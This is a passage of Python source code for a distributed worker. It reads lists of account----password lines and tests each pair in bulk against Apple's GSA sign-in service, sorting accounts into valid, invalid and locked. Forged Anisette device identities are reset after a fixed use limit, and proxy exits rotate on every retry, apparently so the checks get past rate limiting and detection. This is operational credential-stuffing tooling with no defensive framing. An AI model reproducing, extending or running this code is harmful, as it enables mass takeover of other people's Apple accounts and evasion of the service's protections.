    descriptor['_worker_nice'] = 0
    runner = execute_auth_unit if descriptor.get('mode') == 'auth' else execute_unit
    if runner is execute_auth_unit:
        runner(directory, descriptor, stop, proxy_pool=proxy_pool)
    else:
        runner(directory, descriptor, stop)


def execute_unit_group(directory, descriptor, stop):
    """Split one leased package across configured process-owned runtimes.

    Every worker process receives no shared proxy-pool object.  In auth mode
    each process therefore constructs its own _WatermarkProxyPool sized to its
    own thread count, while the coordinator only aggregates files and progress.
    """
    directory = Path(directory)
    descriptor = dict(descriptor)
    started = time.time()
    rows = max(0, int(descriptor.get('rows') or 0))
    configured_processes = max(1, int(descriptor.get('processes') or 1))
    threads = max(1, int(descriptor.get('threads') or 1))
    process_count = min(configured_processes, max(1, rows))
    descriptor['_node_process_count'] = process_count
    descriptor['_node_configured_process_count'] = configured_processes
    descriptor['_node_cpu_count'] = max(1, int(os.cpu_count() or 1))
    descriptor['_active_threads_per_process'] = threads
    descriptor['_proxy_pool_owner'] = 'process'
    debug_path = None
    if _proxy_debug_enabled(descriptor):
        debug_path = directory / 'proxy-debug.jsonl'
        descriptor['_proxy_debug'] = True
        descriptor['_proxy_debug_path'] = str(debug_path)
        _write_proxy_debug(
            debug_path, 'debug_start', job_id=str(descriptor.get('job_id') or ''),
            unit_id=str(descriptor.get('id') or ''), rows=rows,
            processes=process_count, threads=threads,
            requested_processes=configured_processes,
            retries=int(2 if descriptor.get('retries') is None
                        else descriptor.get('retries')),
            timeout=float(descriptor.get('timeout') or 25),
            mode='process_owned_watermark', proxy_pool_owner='process',
            credentials_recorded=False)

    if process_count == 1:
        _group_child(directory, descriptor, stop, proxy_pool=None)
        try:
            progress = json.loads((directory / 'progress.json').read_text('utf-8'))
        except (OSError, ValueError):
            progress = {}
        progress.update(workers=0, worker_limit=1,
                        configured_process_limit=configured_processes,
                        active_process_limit=1, threads_per_process=threads,
                        active_threads_per_process=threads,
                        proxy_pool_owner='process', proxy_pool_count=1,
                        device_owner='process', device_pool_count=1)
        atomic_json(directory / 'progress.json', progress)
        try:
            done = json.loads((directory / 'done.json').read_text('utf-8'))
        except (OSError, ValueError):
            done = {'ok': False, 'processed': int(progress.get('processed') or 0),
                    'error': 'worker_result_missing'}
        done.update(workers=1, configured_process_limit=configured_processes,
                    active_threads_per_process=threads,
                    proxy_pool_owner='process', proxy_pool_count=1,
                    device_owner='process', device_pool_count=1)
        atomic_json(directory / 'done.json', done)
        return

    workers_root = directory / 'workers'
    workers_root.mkdir(mode=0o700, parents=True, exist_ok=True)
    counts = [rows // process_count + (index < rows % process_count)
              for index in range(process_count)]
    child_descriptors = []
    current_row = int(descriptor.get('first_row') or 1)
    with (directory / 'input.part').open('rb') as source:
        for index, count in enumerate(counts):
            child_dir = workers_root / f'{index + 1:03d}'
            child_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
            for name in ('done.json', 'progress.json', 'results.jsonl'):
                (child_dir / name).unlink(missing_ok=True)
            child_input = child_dir / 'input.part'
            with child_input.open('wb') as output:
                child_input.chmod(0o600)
                for _ in range(count):
                    line = source.readline(65537)
                    if not line:
                        raise ValueError('input ended before local fan-out completed')
                    if len(line) > 65536:
                        raise ValueError('input record too long')
                    output.write(line)
            child = dict(descriptor, first_row=current_row, rows=count,
                         processes=1, _worker_process_index=index + 1,
                         _proxy_pool_owner='process', _device_owner='process')
            if descriptor.get('mode') == 'auth':
                assigned = descriptor.get('device_slots') or []
                child['device_slots'] = _partition_device_slots(
                    assigned or range(1, process_count + 1), process_count, index)
                child['device_pool_capacity'] = int(
                    descriptor.get('device_pool_capacity') or max(assigned or [process_count]))
            if debug_path is not None:
                child['_proxy_debug_path'] = str(child_dir / 'proxy-debug.jsonl')
            atomic_json(child_dir / 'manifest.json', child)
            child_descriptors.append((child_dir, child))
            current_row += count
        if source.read(1):
            raise ValueError('input contains more rows than package descriptor')

    context = mp.get_context('spawn')
    children = []
    try:
        for index, (child_dir, child) in enumerate(child_descriptors):
            child_stop = context.Event()
            # None is deliberate: the child creates and owns its own IP pool.
            process = context.Process(
                target=_group_child,
                args=(str(child_dir), child, child_stop, None),
                name=f'package-worker-{index + 1:02d}')
            process.start()
            children.append((process, child_stop, child_dir))

        last_write = 0.0
        last_processed = -1
        last_progress_at = time.monotonic()
        stall_timeout = stall_timeout_seconds(descriptor)
        while any(process.is_alive() for process, _, _ in children):
            if stop.is_set():
                for _, child_stop, _ in children:
                    child_stop.set()
            processed = 0
            active = 0
            live_counts = {}
            for process, _, child_dir in children:
                active += int(process.is_alive())
                try:
                    child_progress = json.loads(
                        (child_dir / 'progress.json').read_text('utf-8'))
                    processed += int(child_progress.get('processed') or 0)
                    for key, value in (child_progress.get('counts') or {}).items():
                        live_counts[key] = live_counts.get(key, 0) + int(value)
                except (OSError, ValueError):
                    pass
            now = time.monotonic()
            if processed != last_processed:
                last_processed = processed
                last_progress_at = now
            elif not stop.is_set() and now - last_progress_at >= stall_timeout:
                raise RuntimeError(
                    f'工作包无进度超过 {int(stall_timeout)} 秒，已中止并交回总控')
            if now - last_write >= 0.25:
                atomic_json(directory / 'progress.json',
                            {'processed': processed, 'started': started,
                             'workers': active, 'worker_limit': process_count,
                             'configured_process_limit': configured_processes,
                             'threads_per_process': threads,
                             'active_threads_per_process': threads,
                             'proxy_pool_owner': 'process',
                             'proxy_pool_count': process_count,
                             'device_owner': 'process',
                             'device_pool_count': process_count,
                             'counts': live_counts})
                last_write = now
            time.sleep(0.05)

        failures = []
        for process, _, child_dir in children:
            process.join()
            try:
                done = json.loads((child_dir / 'done.json').read_text('utf-8'))
            except (OSError, ValueError):
                done = {}
            if process.exitcode != 0 or not done.get('ok'):
                failures.append(str(done.get('error') or
                                    f'worker_exit_{process.exitcode}'))
        if failures:
            raise RuntimeError(failures[0])

        output_digest = hashlib.sha256()
        processed = 0
        merged_counts = {}
        merged_output = directory / 'results.jsonl'
        with merged_output.open('wb') as output:
            merged_output.chmod(0o600)
            for _, _, child_dir in children:
                done = json.loads((child_dir / 'done.json').read_text('utf-8'))
                processed += int(done['processed'])
                for key, value in (done.get('counts') or {}).items():
                    merged_counts[key] = merged_counts.get(key, 0) + int(value)
                with (child_dir / 'results.jsonl').open('rb') as source:
                    for block in iter(lambda: source.read(1024 * 1024), b''):
                        output.write(block)
                        output_digest.update(block)
            output.flush()
            os.fsync(output.fileno())
        if processed != rows:
            raise ValueError('local fan-out result count mismatch')
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started, 'workers': 0,
                     'worker_limit': process_count,
                     'configured_process_limit': configured_processes,
                     'threads_per_process': threads,
                     'active_threads_per_process': threads,
                     'proxy_pool_owner': 'process',
                     'proxy_pool_count': process_count,
                     'device_owner': 'process',
                     'device_pool_count': process_count,
                     'counts': merged_counts})
        atomic_json(directory / 'done.json',
                    {'ok': True, 'processed': processed, 'counts': merged_counts,
                     'checksum': output_digest.hexdigest(),
                     'workers': process_count, 'elapsed': time.time() - started,
                     'configured_process_limit': configured_processes,
                     'active_threads_per_process': threads,
                     'proxy_pool_owner': 'process',
                     'proxy_pool_count': process_count,
                     'device_owner': 'process',
                     'device_pool_count': process_count})
    except Exception as exc:                                      # noqa: BLE001
        for process, child_stop, _ in children:
            child_stop.set()
            process.join(2)
            if process.is_alive():
                process.terminate()
                process.join(2)
        processed = 0
        live_counts = {}
        for _, _, child_dir in children:
            try:
                child_progress = json.loads(
                    (child_dir / 'progress.json').read_text('utf-8'))
                processed += int(child_progress.get('processed') or 0)
                for key, value in (child_progress.get('counts') or {}).items():
                    live_counts[key] = live_counts.get(key, 0) + int(value)
            except (OSError, ValueError):
                pass
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started, 'workers': 0,
                     'worker_limit': process_count,
                     'configured_process_limit': configured_processes,
                     'threads_per_process': threads,
                     'active_threads_per_process': threads,
                     'proxy_pool_owner': 'process',
                     'proxy_pool_count': process_count,
                     'device_owner': 'process',
                     'device_pool_count': process_count,
                     'counts': live_counts})
        atomic_json(directory / 'done.json',
                    {'ok': False, 'processed': processed,
                     'error': f'{type(exc).__name__}: {exc}'[:300],
                     'workers': process_count,
                     'configured_process_limit': configured_processes,
                     'active_threads_per_process': threads,
                     'proxy_pool_owner': 'process',
                     'proxy_pool_count': process_count,
                     'device_owner': 'process',
                     'device_pool_count': process_count})
    finally:
        for process, _, _ in children:
            process.close()

def _find_fastcheck_root(module_file=None, search_path=None):
    """Locate fastcheck even when cluster-lab runs from a nested release copy."""
    import sys
    module_path = Path(module_file or __file__).resolve()
    here = module_path.parents[1]
    candidates = []
    explicit = os.environ.get('CLUSTER_LAB_FASTCHECK_ROOT', '').strip()
    if explicit:
        value = Path(explicit).expanduser().resolve()
        candidates.append(value.parent if value.name == 'fastcheck' else value)
    # Prefer a project-local symlink/package, then walk through release and
    # verification directories until reaching the shared repository root.
    candidates.extend((here, *here.parents))
    for entry in (sys.path if search_path is None else search_path):
        if entry:
            candidates.append(Path(entry).expanduser().resolve())
    unique = []
    seen = set()
    for candidate in candidates:
        key = str(candidate)
        if key in seen:
            continue
        seen.add(key)
        unique.append(candidate)
        if (candidate / 'fastcheck').is_dir():
            return candidate, unique
    return None, unique


def _load_fastcheck():
    """按需挂载 fastcheck，兼容源码、软链接及嵌套发布副本。"""
    import sys
    root, searched = _find_fastcheck_root()
    if root is None:
        locations = '、'.join(str(path / 'fastcheck') for path in searched[:8])
        raise RuntimeError(f'找不到 fastcheck 目录；已检查：{locations}')
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    try:
        from fastcheck.devices import DevicePool
    except ModuleNotFoundError as exc:
        if (root / 'fastcheck').exists():
            raise RuntimeError(
                f'无法导入 fastcheck（{root / "fastcheck"} 存在但不可读或缺少依赖）：{exc}') from exc
        raise RuntimeError(f'找不到 fastcheck 目录：{root / "fastcheck"}') from exc
    from fastcheck.protocols.gsa_status import check as gsa_check
    from fastcheck.status import result_bucket
    return DevicePool, gsa_check, result_bucket


def _split_account(line):
    """输入行形如 账号----密码；没有分隔符时整行当账号、密码留空。"""
    for separator in ('----', '\t', ':'):
        if separator in line:
            account, _, password = line.partition(separator)
            return account.strip(), password.strip()
    return line.strip(), ''


def _usage_snapshot(device_root):
    if not device_root:
        return {}
    try:
        value = json.loads((Path(device_root) / 'usage.json').read_text('utf-8'))
        return {int(slot): max(0, int(count)) for slot, count in value.items()}
    except (OSError, ValueError, TypeError, AttributeError):
        return {}


def _bump_usage(device_root, counts, resets=()):
    """每个工作包合并写一次设备计数，并用进程锁防止覆盖。"""
    if not device_root or (not counts and not resets):
        return
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    try:
        with portalocker.Lock(str(lock), mode='a+', timeout=10):
            try:
                data = json.loads(path.read_text('utf-8')) if path.exists() else {}
            except (OSError, ValueError):
                data = {}
            for slot in resets:
                data[str(int(slot))] = 0
            for slot, count in counts.items():
                key = str(int(slot))
                data[key] = int(data.get(key) or 0) + int(count)
            atomic_json(path, data)
    except (OSError, portalocker.exceptions.LockException):
        pass


def record_device_registration(device_root, slot, proxy, model=''):
    """Persist the first registration facts for the current slot generation."""
    if not device_root:
        return False
    directory = Path(device_root) / 'registrations'
    path = directory / f'{int(slot):03d}.json'
    try:
        directory.mkdir(mode=0o700, parents=True, exist_ok=True)
        descriptor = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        value = {'slot': int(slot), 'proxy': str(proxy or ''), 'model': str(model or ''),
                 'at': time.strftime('%Y-%m-%d %H:%M:%S'), 'ts': time.time()}
        with os.fdopen(descriptor, 'w', encoding='utf-8') as handle:
            json.dump(value, handle, ensure_ascii=False, separators=(',', ':'))
        return True
    except FileExistsError:
        return False
    except (OSError, TypeError, ValueError):
        return False


def execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    """真实认证执行入口：任何异常都落成 done.json，避免节点只看到"进程退出"。"""
    try:
        _execute_auth_unit(directory, descriptor, stop, proxy_pool=proxy_pool)
    except Exception as exc:                                       # noqa: BLE001
        atomic_json(Path(directory) / 'done.json',
                    {'ok': False, 'processed': 0,
                     'error': f'{type(exc).__name__}: {exc}'[:300]})


def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
    from collections import Counter
    import heapq
    import queue
    import sys

    directory = Path(directory)
    started = time.time()
    output_path = directory / 'results.jsonl'
    DevicePool, gsa_check, result_bucket = _load_fastcheck()
    proxy = descriptor.get('proxy')
    fetch_proxy_batch = None
    if descriptor.get('proxy_api') and proxy_pool is None:
        from fastcheck.proxy_pool import fetch_proxies
        scheme = descriptor.get('proxy_scheme') or 'socks5h'

        def fetch_proxy_batch(count):
            return fetch_proxies(
                descriptor['proxy_api'], count,
                scheme=None if scheme == 'http' else scheme)

    elif not proxy:
        proxy = None
    origin = descriptor.get('origin') or 'https://new.ani.sidestore.io'
    device_root = descriptor.get('device_root')
    capacity = int(descriptor.get('device_pool_capacity') or
                   descriptor.get('device_capacity') or 8)
    configured_slots = descriptor.get('device_slots')
    if isinstance(configured_slots, list) and configured_slots:
        slot_ids = [max(1, min(capacity, int(value))) for value in configured_slots]
    else:
        slot_ids = list(range(1, capacity + 1))
    timeout = float(descriptor.get('timeout') or 25)
    retry_value = descriptor.get('retries')
    retries = max(0, int(2 if retry_value is None else retry_value))
    # ``timeout`` applies independently to every configured attempt.  There is
    # deliberately no whole-account budget: retries each receive a fresh full
    # timeout and the retry count is the only total-attempt limit.
    public_header_use_limit = max(1, int(descriptor.get('public_header_use_limit') or 15))
    device_use_limit = max(1, int(descriptor.get('device_use_limit') or 30))
    retry_delay = max(0.0, float(descriptor.get('_retry_delay',
                                                PROXY_RETRY_DELAY_SECONDS)))
    configured_workers = max(1, int(descriptor.get('threads') or 1))
    workers = max(1, int(descriptor.get('_active_threads_per_process') or
                         configured_workers))
    # Match 并发3: unless explicitly capped by a future task option, every
    # process-local worker may prepare its own public headers concurrently.
    header_gate = threading.Semaphore(workers)
    runtime_proxy_pool = fetch_proxy_batch is not None
    if runtime_proxy_pool:
        proxy_pool = _ReferenceIpPoolAdapter(fetch_proxy_batch, workers)
        proxy_pool.bootstrap()
    debug_enabled = _proxy_debug_enabled(descriptor)
    detailed_error_enabled = bool(descriptor.get('_detailed_error_log'))
    debug_path = (descriptor.get('_proxy_debug_path') or
                  str(directory / 'proxy-debug.jsonl')) if debug_enabled else None
    exit_ip_debug = _ProxyExitIpDebug(debug_path) if debug_enabled else None
    counters = Counter()
    processed = 0
    last_progress = time.monotonic()

    try:
        raw_pool = DevicePool(device_root, origin, max_devices=capacity, in_memory=True)
    except TypeError:
        # Older test doubles retain the original constructor.
        raw_pool = DevicePool(device_root, origin, max_devices=capacity)
    pool = _ProcessOwnedDevicePool(raw_pool, slot_ids)
    loaded_devices = pool.preload()
    from fastcheck.workers import device_profile
    if debug_enabled:
        _write_proxy_debug(debug_path, 'worker_start',
                           rows=int(descriptor.get('rows') or 0),
                           first_row=int(descriptor.get('first_row') or 1),
                           threads=workers, configured_threads=configured_workers,
                           worker_nice=int(descriptor.get('_worker_nice') or 0),
                           retries=retries, timeout=timeout,
                           slots=slot_ids, loaded_device_count=len(loaded_devices),
                           device_owner='process', credentials_recorded=False)

    # 设备文件在进程启动时按分片加载，后续线程只能绑定本进程的设备。
    # 账号队列必须等到本进程所有设备都注册成功并取到公共头后才打开。
    identities, infos = {}, {}
    device_labels = {slot: _device_id_label(value.get('device_id'))
                     for slot, value in loaded_devices.items()}

    thread_state = threading.local()
    device_states = {
        slot: {'slot': slot, 'proxy': None, 'identity': None, 'identity_uses': 0,
               'info': None, 'device_label': device_labels.get(slot, ''),
               'anisette_client': None,
               'identity_lock': threading.RLock()}
        for slot in slot_ids
    }

    def state_for_thread():
        state = getattr(thread_state, 'value', None)
        if state is None:
            raise RuntimeError('worker thread has no process-local device checkout')
        return state

    def acquire_pool_proxy():
        """Wait for a process-owned exit without requiring an account/device checkout."""
        empty_since = None
        while not stop.is_set():
            lease = proxy_pool.acquire(wait=PROXY_ACQUIRE_WAIT_SECONDS)
            if lease is not None:
                return lease[0], lease
            state = _proxy_pool_snapshot(proxy_pool)
            if int(state.get('known') or 0) > 0:
                empty_since = None
                continue
            now = time.monotonic()
            if empty_since is None:
                empty_since = now
            if now - empty_since >= PROXY_EMPTY_GRACE_SECONDS:
                break
        return None, None

    def proxy_for(index, force=False):
        if proxy_pool is not None:
            if runtime_proxy_pool:
                cached = getattr(thread_state, 'proxy_lease', None)
                served = int(getattr(thread_state, 'proxy_lease_uses', 0) or 0)
                if cached is not None:
                    margin = float(getattr(proxy_pool, 'lease_margin', 0.0))
                    if (not force and served < PROXY_ACCOUNTS_PER_LEASE
                            and len(cached) > 1
                            and float(cached[1]) > time.monotonic() + margin):
                        thread_state.proxy_lease_uses = served + 1
                        return cached[0], cached
                    proxy_pool.release(cached, healthy=True)
                    thread_state.proxy_lease = None
                    thread_state.proxy_lease_uses = 0
            # Pool exhaustion is backpressure, not an account result.  A
            # healthy exit may be busy in another worker and become reusable
            # after that request finishes, so keep waiting while the pool has
            # any known (queued or leased) inventory.  Only report an empty
            # pool after both queues and all active leases have remained empty
            # for a full supplier window.
            acquired = acquire_pool_proxy()
            if runtime_proxy_pool and acquired[1] is not None:
                thread_state.proxy_lease = acquired[1]
                thread_state.proxy_lease_uses = 1
            return acquired
        state = state_for_thread()
        if not state['proxy']:
            state['proxy'] = proxy
        return state['proxy'], None

    def apple_retry_later(result):
        apple_text = ' '.join(str(result.get(key) or '').strip()
                              for key in ('apple_message', 'reason', 'detail')).casefold()
        phrases = (
            'unable to sign you in to your apple account. try again later',
            'this request could not be completed because of a server error',
            'this action cannot be completed',
            'this action could not be completed. try again',
            'the request cannot be processed at this time. please try again later',
            'we cannot process your request, please try again later',
            'your account information was entered incorrectly',
        )
        return any(phrase in apple_text for phrase in phrases)

    def retryable_20970(result):
        """Retry every -20970 except explicit inactive/locked account verdicts."""
        try:
            http = int(result.get('http'))
            apple_ec = int(result.get('apple_ec'))
        except (TypeError, ValueError):
            return False
        text = ' '.join(str(result.get(key) or '').strip()
                        for key in ('apple_message', 'reason', 'detail')).casefold()
        final_phrases = ('this apple account is not active',
                         'this apple account has been locked for security reasons',
                         'this apple account has been locked')
        return (http == 200 and apple_ec == -20970
                and not any(phrase in text for phrase in final_phrases))

    def unlabelled_20970(result):
        try:
            http = int(result.get('http'))
            apple_ec = int(result.get('apple_ec'))
        except (TypeError, ValueError):
            return False
        message = str(result.get('apple_message') or result.get('reason') or '').strip()
        return http == 200 and apple_ec == -20970 and not message

    def retryable_transport(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        try:
            apple_ec = int(result.get('apple_ec'))
        except (TypeError, ValueError):
            apple_ec = None
        # 没拿到 HTTP 响应、服务不可用、Apple 明确要求稍后再试，或
        # Anisette/设备环境失效时重试。重试次数仍严格受用户设置控制。
        return (http in (0, 503)
                or apple_ec in (-22421, -22410, -332000, -33200, -3000303)
                or retryable_20970(result)
                or apple_retry_later(result))

    def auth_result_bucket(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        if http in (0, 503):
            return 'timeout'
        if unlabelled_20970(result):
            return 'timeout'
        bucket = result_bucket(result)
        if retryable_20970(result) and bucket in ('invalid', 'undetermined', 'unknown'):
            return 'undetermined'
        # 没有命中内置英文原因的结果保留为“其他错误”，
        # 不再因某个 Apple ec 错误码而猜测账号已失效。
        return 'undetermined' if bucket in ('undetermined', 'unknown') else bucket

    identity_default = object()
    usage_base = _usage_snapshot(device_root)
    usage_counts = Counter()
    usage_resets = set()
    usage_lock = threading.Lock()
    warmup_retry_delay = max(
        0.0, float(descriptor.get('_device_warmup_retry_delay', retry_delay)))

    def warm_device(slot_id):
        """Load ready devices; only registration is allowed before workers."""
        last_error = None
        for attempt in range(retries + 1):
            if stop.is_set():
                raise InterruptedError('租约失效或节点关闭')
            inspected = pool.inspect(slot_id)
            ready = inspected['state'] == 'ready'
            profile = device_profile(pool, slot_id)
            info = {'client_info': profile['client_info'],
                    'user_agent': profile['user_agent']}
            if ready and runtime_proxy_pool:
                label = _device_id_label(inspected.get('device_id'))
                infos[slot_id] = info
                # Sentinel keeps the slot active without prefetching a header.
                identities[slot_id] = identity_default
                device_labels[slot_id] = label
                state = device_states[slot_id]
                with state['identity_lock']:
                    state.update(info=info, identity=None,
                                 identity_uses=0, device_label=label)
                return slot_id
            # Runtime Anisette uses provider_direct=True, so the proxy argument
            # is intentionally ignored.  Do not burn/age a provider lease or
            # mark an untested port healthy while fetching public headers.
            warm_proxy, lease = ((None, None) if runtime_proxy_pool else
                                 ((proxy, None) if proxy_pool is None
                                  else acquire_pool_proxy()))
            if descriptor.get('proxy_api') and not warm_proxy and not runtime_proxy_pool:
                last_error = RuntimeError('设备预热未能获取代理出口')
            else:
                try:
                    # A new device becomes ready only through this registration
                    # request.  Existing ready devices returned above; their
                    # bound workers fetch headers immediately before take_task.
                    with header_gate:
                        identity = pool.fetch_headers(
                            slot_id, info, max(timeout, 40), registered=False,
                            proxy=warm_proxy, provider_direct=True)
                    refreshed = pool.inspect(slot_id)
                    label = (_device_id_label(refreshed.get('device_id')) or
                             _device_id_label(inspected.get('device_id')))
                    infos[slot_id] = info
                    identities[slot_id] = identity
                    device_labels[slot_id] = label
                    state = device_states[slot_id]
                    with state['identity_lock']:
                        state.update(info=info, identity=identity,
                                     identity_uses=0, device_label=label)
                    if not ready and refreshed['state'] == 'ready':
                        record_device_registration(
                            device_root, slot_id, REGISTRATION_EXIT_IP_SKIPPED,
                            profile.get('model', ''))
                    if proxy_pool is not None:
                        proxy_pool.release(lease, healthy=True)
                    return slot_id
                except Exception as exc:                           # noqa: BLE001
                    last_error = exc
                    infos[slot_id] = None
                    identities[slot_id] = None
                    if proxy_pool is not None and lease is not None:
                        discard = getattr(proxy_pool, 'discard', None)
                        if callable(discard):
                            discard(lease)
                        else:
                            proxy_pool.release(lease, healthy=False)
                    if debug_enabled:
                        endpoint = _proxy_identity(warm_proxy)
                        _write_proxy_debug(
                            debug_path, 'device_warmup_error', slot=slot_id,
                            attempt=attempt, attempt_limit=retries + 1,
                            endpoint=endpoint['endpoint'], host=endpoint['host'],
                            port=endpoint['port'], error_type=type(exc).__name__,
                            detail=_proxy_debug_detail(exc),
                            pool=_proxy_pool_snapshot(proxy_pool))
            if attempt < retries and warmup_retry_delay:
                if stop.wait(warmup_retry_delay):
                    raise InterruptedError('租约失效或节点关闭')
        raise RuntimeError(
            f'设备 {slot_id} 预热失败，未获取公共请求头: '
            f'{type(last_error).__name__}: {last_error}')

    # 这是账号输入的硬门闩：在此之前不打开 input.part，
    # 因此注册/公共头超时不会占用账号，也不会写成账号超时结果。
    prepared = 0
    warmup_errors = {}
    original_device_target = len(slot_ids)
    atomic_json(directory / 'progress.json',
                {'processed': 0, 'started': started,
                 'stage': 'preparing_devices', 'prepared_devices': 0,
                 'device_target': original_device_target, 'counts': {}})
    last_warmup_progress = time.monotonic()
    with ThreadPoolExecutor(max_workers=min(workers, len(slot_ids)),
                            thread_name_prefix='device-warmup') as warmup_pool:
        futures = {warmup_pool.submit(warm_device, slot_id): slot_id
                   for slot_id in slot_ids}
        for future, slot_id in futures.items():
            try:
                future.result()
                prepared += 1
            except Exception as exc:                              # noqa: BLE001
                warmup_errors[slot_id] = exc
            warmup_done = prepared + len(warmup_errors)
            now = time.monotonic()
            if (warmup_done == original_device_target or warmup_done % 25 == 0
                    or now - last_warmup_progress >= 0.25):
                atomic_json(directory / 'progress.json',
                            {'processed': 0, 'started': started,
                             'stage': 'preparing_devices',
                             'prepared_devices': prepared,
                             'failed_devices': len(warmup_errors),
                             'device_target': original_device_target, 'counts': {}})
                last_warmup_progress = now
    slot_ids = [slot for slot in slot_ids if identities.get(slot) is not None]
    if not slot_ids:
        first_slot, first_error = next(iter(warmup_errors.items()))
        raise RuntimeError(
            f'设备 {first_slot} 预热失败，未获取公共请求头: '
            f'{type(first_error).__name__}: {first_error}')
    device_states = {slot: device_states[slot] for slot in slot_ids}
    device_allocator = _ProcessDeviceAllocator(device_states, usage_base)
    bind_device_to_thread = runtime_proxy_pool
    atomic_json(directory / 'progress.json',
                {'processed': 0, 'started': started, 'stage': 'ready',
                 'prepared_devices': prepared,
                 'failed_devices': len(warmup_errors),
                 'device_target': original_device_target,
                 'active_devices': len(slot_ids), 'counts': {}})

    def close_persistent_anisette_client(worker_state):
        """Close the one Anisette session owned by a persistent worker."""
        if worker_state is None:
            return
        client = worker_state.get('anisette_client')
        worker_state['anisette_client'] = None
        if client is not None:
            try:
                client.close()
            except Exception:                                      # noqa: BLE001
                pass

    def fetch_persistent_identity(slot_id, worker_state, *, registered,
                                  account_proxy=None):
        """Match 并发3: reuse one direct Anisette ``Client`` per thread.

        Supplying ``client_info`` makes the provider omit the two device model
        headers, so they must be restored before the identity reaches GSA.
        Test doubles without ``store`` keep using ``DevicePool.fetch_headers``.
        """
        profile = device_profile(pool, slot_id)
        info = {'client_info': profile['client_info'],
                'user_agent': profile['user_agent']}
        store_factory = getattr(pool, 'store', None)
        client = (worker_state.get('anisette_client')
                  if worker_state is not None else None)
        if runtime_proxy_pool and callable(store_factory):
            if client is None:
                from fastcheck.protocols.anisette_v3 import Client
                client = Client(
                    origin, timeout=max(timeout, 20),
                    store=store_factory(slot_id, registered=registered),
                    client_info=dict(info), provider_direct=True)
                if worker_state is not None:
                    worker_state['anisette_client'] = client
            with header_gate:
                client.deadline = time.monotonic() + max(timeout, 20)
                identity = client.headers()
            if isinstance(identity, dict):
                identity = dict(identity)
                identity['X-MMe-Client-Info'] = profile['client_info']
                identity['X-Mme-Client-Info'] = profile['client_info']
                identity.setdefault('User-Agent', profile['user_agent'])
        else:
            with header_gate:
                identity = pool.fetch_headers(
                    slot_id, info, max(timeout, 40), registered=registered,
                    proxy=account_proxy, provider_direct=True)
        return identity, info, profile

    def retire_device_if_due(slot_id, worker_state):
        with usage_lock:
            used = int(usage_base.get(slot_id, 0)) + int(usage_counts.get(slot_id, 0))
            if used < device_use_limit:
                return False
            pool.reset(slot_id)
            usage_base[slot_id] = 0
            usage_counts[slot_id] = 0
            usage_resets.add(slot_id)
            device_allocator.reset_usage(slot_id, 0)
            try:
                (Path(device_root) / 'registrations' / f'{int(slot_id):03d}.json').unlink()
            except OSError:
                pass
            if worker_state is not None:
                close_persistent_anisette_client(worker_state)
                worker_state.update(identity=None, identity_uses=0,
                                    info=None, device_label='')
            device_labels.pop(slot_id, None)
            return True

    def mark_device_used(slot_id):
        with usage_lock:
            usage_counts[slot_id] += 1

    def _one_with_borrowed_device(row, index, line, start_attempt=0,
                                   account_started=None,
                                   identity_override=identity_default,
                                   previous_proxy=None, force_proxy=False):
        if stop.is_set():
            return row, line, {'status': 'unknown', 'kind': 'stopped'}
        account, password = _split_account(line)
        # Every execution path uses the checked-out process-local device state.
        # Test/injected proxy pools must not bypass the same per-worker header
        # lifecycle used by the production runtime.
        worker_state = state_for_thread()
        if worker_state is not None:
            slot_id = worker_state['slot']
            _ignored, account_prefix = _slot_for_account(account, [slot_id])
        else:
            slot_id, account_prefix = _slot_for_account(account, slot_ids)
        # 空白行仍是输入文件中的一条记录，但不应触发真实认证请求。
        # 作为未判断结果落盘，保证小包按描述的 rows 正常完成。
        if not line.strip():
            return row, line, {'status': 'undetermined', 'kind': 'blank_record',
                               'slot': slot_id, 'device_key': account_prefix, 'elapsed': 0}
        if start_attempt == 0:
            retire_device_if_due(slot_id, worker_state)
            if (worker_state is not None
                    and int(worker_state.get('identity_uses') or 0) >= public_header_use_limit):
                worker_state['identity'] = None
                worker_state['identity_uses'] = 0
        if worker_state is not None:
            identity = worker_state['identity']
        else:
            identity = (identities.get(slot_id) if identity_override is identity_default
                        else identity_override)
        result = None
        previous_proxy = previous_proxy or {'endpoint': '', 'host': '', 'port': None}
        # 用户设置的重试次数仍是唯一上限；节点池只负责每次重试换出口，
        # 不会在“0 次重试”时暗中多发请求。
        attempt_limit = retries + 1
        for attempt in range(start_attempt, attempt_limit):
            acquire_before = _proxy_pool_snapshot(proxy_pool) if debug_enabled else {}
            acquire_started = time.monotonic() if debug_enabled else None
            account_proxy, lease = proxy_for(index + attempt, force=force_proxy)
            force_proxy = False
            acquire_ms = (round((time.monotonic() - acquire_started) * 1000, 2)
                          if debug_enabled else None)
            current_proxy = (_proxy_identity(account_proxy) if debug_enabled else
                             {'endpoint': '', 'host': '', 'port': None})
            switch = {
                'previous_endpoint': previous_proxy['endpoint'],
                'host_changed': (previous_proxy['host'] != current_proxy['host']
                                 if previous_proxy['host'] else None),
                'port_changed': (previous_proxy['port'] != current_proxy['port']
                                 if previous_proxy['port'] is not None else None),
                'pair_changed': (previous_proxy['endpoint'] != current_proxy['endpoint']
                                 if previous_proxy['endpoint'] else None),
            }
            if descriptor.get('proxy_api') and not account_proxy:
                result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                          'stage': 'init', 'detail': '线程未能获取代理出口'}
                if debug_enabled:
                    _write_proxy_debug(
                        debug_path, 'proxy_unavailable', row=row, slot=slot_id,
                        attempt=attempt, attempt_limit=attempt_limit,
                        request_sent=False, acquire_ms=acquire_ms, **switch,
                        pool_before=acquire_before,
                        pool_after=_proxy_pool_snapshot(proxy_pool))
                if attempt + 1 >= attempt_limit:
                    result['_proxy_retries'] = attempt
                    break
                result.update(_retry_at=time.monotonic() + retry_delay,
                              _retry_attempt=attempt + 1,
                              _retry_started=account_started,
                              _retry_identity=identity,
                              _retry_previous=current_proxy,
                              _retry_force_proxy=True)
                return row, line, result
